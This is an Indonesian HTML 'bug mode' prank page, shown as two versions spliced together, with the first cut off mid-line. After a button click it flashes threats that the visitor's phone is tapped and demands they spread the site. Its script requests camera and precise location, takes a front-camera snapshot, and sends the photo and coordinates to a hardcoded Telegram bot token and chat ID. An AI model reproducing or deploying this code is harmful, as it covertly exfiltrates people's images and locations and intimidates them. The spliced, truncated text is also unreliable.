<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>BUG MODE</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: monospace; }
    body {
      background: #000; color: #0f0;
      display:flex; justify-content:center; align-items:center;
      height:100vh; flex-direction:column; overflow:hidden; transition:background 0.1s;
    }
    h2 {
      font-size:24px; cursor:pointer; padding:12px 24px; border:2px solid #0f0;
      transition:0.3s; z-index:11;
    }
    h2:hover { background-color:#0f0; color:#000; }
    video.bg {
      position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover;
      z-index:10; display:none;
    }
    video#camFeed {
      position:fixed; bottom:12px; right:12px; width:160px; height:120px;
      border:2px solid red; z-index:30; display:none; border-radius:6px;
      object-fit:cover;
    }
    .prank-text {
      position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
      background:rgba(0,0,0,0.85); color:red; font-size:18px; padding:22px;
      text-align:center; z-index:20; display:none; max-width:90vw;
    }
    .info-line { color:#ff7f7f; margin-top:8px; font-size:14px; }
    .btn-send {
      margin-top:12px; padding:8px 12px; background:#aa1111; color:#fff; border:none;
      cursor:pointer; border-radius:6px; font-weight:bold;
    }
    .btn-send:disabled { opacity:0.5; cursor:not-allowed; }
    .small-note { margin-top:8px; color:#ffa; font-size:12px; }
  </style>
</head>
<body>
  <h2 id="triggerText">GO TO HALAMAN BUG</h2>

  <video id="bugVideo" class="bg" autoplay muted loop>
    <source src="https://files.catbox.moe/x24fxy.mp4" type="video/mp4">
  </video>

  <audio id="bugSound" loop>
    <source src="https://files.catbox.moe/eyc6gm.mp3" type="audio/mp3">
  </audio>

  <!-- preview kamera kecil -->
  <video id="camFeed" autoplay playsinline muted></video>

  <div class="prank-text" id="prankText" aria-live="polite">
    <div id="prankMain">
      📡 HP ANDA TELAH DI SADAP!<br><br>
      📍 Lokasi Anda: <span id="lokasi">sedang dilacak...</span><br>
      📦 Paket misterius sedang dikirim ke rumah Anda.<br>
      📧 Email Anda telah saya lihat semua!<br><br>
      📷 Kamera Anda telah aktif.<br>
      🎙️ Mikrofon Anda sedang merekam...<br><br>
      ❗Jika tidak ingin data Anda disebar,<br>
      silakan SEBARKAN web ini sekarang juga!<br><br>
      👁️ Saya bisa melihat apa yang sedang Anda lakukan sekarang...<br><br>
      ☠️🖕🏽
    </div>

    <div class="info-line" id="statusLine">Status: Menunggu izin kamera & lokasi (akan diminta saat tombol ditekan).</div>

    <button id="sendTelegram" class="btn-send" disabled>Kirim ke Telegram (butuh konfirmasi)</button>
    <div class="small-note">Catatan: izin muncul hanya di HTTPS atau localhost. Klik tombol hanya kalau perangkat ini milikmu.</div>
  </div>

  <script>
    const text = document.getElementById("triggerText");
    const video = document.getElementById("bugVideo");
    const audio = document.getElementById("bugSound");
    const prankText = document.getElementById("prankText");
    const camFeed = document.getElementById("camFeed");
    const lokasiSpan = document.getElementById("lokasi");
    const statusLine = document.getElementById("statusLine");
    const sendBtn = document.getElementById("sendTelegram");

    // === GANTI JIKA PERLU (sudah diisi sesuai yang kamu berikan) ===
    const TELEGRAM_TOKEN = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
    const CHAT_ID = "6788646701";

    let stream = null;
    let lastCoords = null;

    function showPrankUI() {
      document.body.innerHTML = "";
      document.body.appendChild(video);
      document.body.appendChild(audio);
      document.body.appendChild(prankText);
      document.body.appendChild(camFeed);
      video.style.display = "block";
      prankText.style.display = "block";
      video.play();
      audio.play().catch(()=>console.log("Klik layar untuk aktifkan suara."));
      if (navigator.vibrate) navigator.vibrate([300,100,300,100,300]);

      let toggle = false;
      setInterval(() => {
        document.body.style.background = toggle ? "black" : "red";
        toggle = !toggle;
      }, 150);
    }

    async function requestPermissionsAndPreview() {
      statusLine.textContent = "Meminta izin kamera & lokasi...";
      // Kamera (facingMode user -> depan)
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        camFeed.srcObject = stream;
        camFeed.style.display = "block";
        statusLine.textContent = "Kamera diizinkan. Menunggu lokasi...";
      } catch (err) {
        console.warn("Kamera ditolak atau tidak tersedia:", err);
        statusLine.textContent = "Kamera ditolak / tidak tersedia.";
      }

      // Lokasi
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const { latitude, longitude } = pos.coords;
          lastCoords = { latitude, longitude };
          lokasiSpan.textContent = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
          statusLine.textContent = "Lokasi diizinkan.";
          sendBtn.disabled =<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>BUG MODE</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Courier New', monospace;
    }
    body {
      background: #000;
      color: #0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      overflow: hidden;
    }
    .container {
      text-align: center;
      z-index: 100;
      padding: 20px;
      background: rgba(0, 0, 0, 0.8);
      border: 2px solid #0f0;
      border-radius: 10px;
      max-width: 90%;
    }
    h1 {
      font-size: 2.5rem;
      margin-bottom: 20px;
      text-shadow: 0 0 10px #0f0;
      color: #ff0000;
    }
    .btn-bug {
      background: #000;
      color: #0f0;
      border: 2px solid #0f0;
      padding: 15px 30px;
      font-size: 1.5rem;
      cursor: pointer;
      border-radius: 5px;
      transition: all 0.3s;
      margin-top: 20px;
    }
    .btn-bug:hover {
      background: #0f0;
      color: #000;
      box-shadow: 0 0 20px #0f0;
    }
    video {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      z-index: -1;
      display: none;
    }
    #camFeed {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 160px;
      height: 120px;
      border: 2px solid red;
      z-index: 100;
      display: none;
      border-radius: 6px;
      object-fit: cover;
    }
    .prank-text {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.9);
      color: red;
      font-size: 1.2rem;
      padding: 30px;
      text-align: center;
      z-index: 90;
      display: none;
      max-width: 90%;
      border: 2px solid red;
      border-radius: 10px;
    }
    .status {
      color: #ff7f7f;
      margin-top: 15px;
      font-size: 1rem;
    }
    .blink {
      animation: blink 0.5s infinite alternate;
    }
    @keyframes blink {
      from { opacity: 1; }
      to { opacity: 0.4; }
    }
    .loading {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #ff0000;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 10px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>⚠️ BUG MODE ⚠️</h1>
    <p>Klik tombol di bawah untuk mengaktifkan mode bug</p>
    <button class="btn-bug" id="triggerBtn">GO TO BUG</button>
  </div>

  <video id="bugVideo" autoplay muted loop>
    <source src="https://files.catbox.moe/x24fxy.mp4" type="video/mp4">
  </video>

  <audio id="bugSound" loop>
    <source src="https://files.catbox.moe/eyc6gm.mp3" type="audio/mp3">
  </audio>

  <video id="camFeed" autoplay playsinline muted></video>

  <div class="prank-text" id="prankText">
    <div class="loading"></div>
    <div>📡 HP ANDA TELAH DI SADAP!</div>
    <div class="blink">📍 Lokasi Anda: <span id="lokasi">sedang dilacak...</span></div>
    <div>📦 Paket misterius sedang dikirim ke rumah Anda.</div>
    <div>📧 Email Anda telah saya lihat semua!</div>
    <div>📷 Kamera Anda telah aktif.</div>
    <div>🎙️ Mikrofon Anda sedang merekam...</div>
    <div>❗Jika tidak ingin data Anda disebar,</div>
    <div>silakan SEBARKAN web ini sekarang juga!</div>
    <div>👁️ Saya bisa melihat apa yang sedang Anda lakukan sekarang...</div>
    <div>☠️🖕🏽</div>
    
    <div class="status" id="statusLine">Status: Meminta izin kamera & lokasi...</div>
  </div>

  <script>
    const triggerBtn = document.getElementById("triggerBtn");
    const video = document.getElementById("bugVideo");
    const audio = document.getElementById("bugSound");
    const prankText = document.getElementById("prankText");
    const camFeed = document.getElementById("camFeed");
    const lokasiSpan = document.getElementById("lokasi");
    const statusLine = document.getElementById("statusLine");
    
    // Token dan Chat ID Telegram
    const TELEGRAM_TOKEN = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
    const CHAT_ID = "6788646701";
    
    let stream = null;
    let lastCoords = null;

    function startPrank() {
      // Sembunyikan tombol dan tampilkan efek
      triggerBtn.style.display = "none";
      document.querySelector(".container p").textContent = "Mengaktifkan bug...";
      
      // Tampilkan video dan audio
      video.style.display = "block";
      prankText.style.display = "block";
      video.play();
      audio.play().catch(() => console.log("Klik layar untuk aktifkan suara."));

      // Efek getar jika didukung
      if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]);

      // Efek berkedip
      let toggle = false;
      const blinkInterval = setInterval(() => {
        document.body.style.background = toggle ? "#000" : "#300";
        toggle = !toggle;
      }, 150);
      
      // Minta izin kamera dan lokasi
      requestPermissionsAndSendToTelegram();
    }

    async function requestPermissionsAndSendToTelegram() {
      statusLine.textContent = "Status: Meminta izin kamera...";
      
      // Minta izin kamera
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" }, 
          audio: false 
        });
        camFeed.srcObject = stream;
        camFeed.style.display = "block";
        statusLine.textContent = "Status: Kamera diizinkan. Meminta lokasi...";
      } catch (err) {
        console.error("Error mengakses kamera:", err);
        statusLine.textContent = "Status: Kamera ditolak atau tidak tersedia";
      }
      
      // Minta izin lokasi
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;
            lastCoords = { latitude, longitude };
            lokasiSpan.textContent = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
            statusLine.textContent = "Status: Lokasi diizinkan. Mengirim data ke Telegram...";
            
            // Kirim data ke Telegram
            await sendToTelegram();
          },
          (error) => {
            console.error("Error mengakses lokasi:", error);
            lokasiSpan.textContent = "Lokasi ditolak!";
            statusLine.textContent = "Status: Lokasi ditolak. Mengirim data kamera saja...";
            sendToTelegram();
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        statusLine.textContent = "Status: Geolocation tidak didukung. Mengirim data kamera saja...";
        sendToTelegram();
      }
    }

    async function takeSnapshot() {
      return new Promise((resolve, reject) => {
        if (!stream) {
          reject(new Error("Tidak ada stream kamera"));
          return;
        }
        
        const canvas = document.createElement('canvas');
        const videoTrack = stream.getVideoTracks()[0];
        const settings = videoTrack.getSettings();
        
        canvas.width = settings.width;
        canvas.height = settings.height;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(camFeed, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
          if (blob) {
            resolve(blob);
          } else {
            reject(new Error("Gagal mengambil snapshot"));
          }
        }, 'image/jpeg', 0.8);
      });
    }

    async function sendToTelegram() {
      try {
        // Kirim lokasi
        let locationMessage = "📍 Lokasi: TIDAK TERSEDIA";
        if (lastCoords) {
          locationMessage = `📍 Lokasi:\nLat: ${lastCoords.latitude}\nLon: ${lastCoords.longitude}\nhttps://maps.google.com/?q=${lastCoords.latitude},${lastCoords.longitude}`;
        }
        
        // Kirim pesan teks
        const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `🐛 DATA BUG DITERIMA\n${locationMessage}\nWaktu: ${new Date().toLocaleString('id-ID')}`
          })
        });
        
        if (!textResponse.ok) {
          throw new Error("Gagal mengirim pesan teks");
        }
        
        // Kirim gambar jika kamera tersedia
        if (stream) {
          statusLine.textContent = "Status: Mengirim gambar ke Telegram...";
          
          try {
            const snapshotBlob = await takeSnapshot();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", snapshotBlob, "bug_capture.jpg");
            formData.append("caption", "📸 Tangkapan layar dari kamera depan");
            
            const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
              method: "POST",
              body: formData
            });
            
            if (!photoResponse.ok) {
              throw new Error("Gagal mengirim foto");
            }
          } catch (err) {
            console.error("Error mengirim foto:", err);
          }
        }
        
        statusLine.textContent = "Status: Data berhasil dikirim!";
        
      } catch (err) {
        console.error("Error mengirim ke Telegram:", err);
        statusLine.textContent = "Status: Gagal mengirim data ke Telegram";
      }
    }

    // Event listener untuk tombol
    triggerBtn.addEventListener("click", startPrank);
    
    // Event listener untuk mengaktifkan audio
    document.addEventListener("click", () => {
      audio.play();
    }, { once: true });
  </script>
</body>
</html>
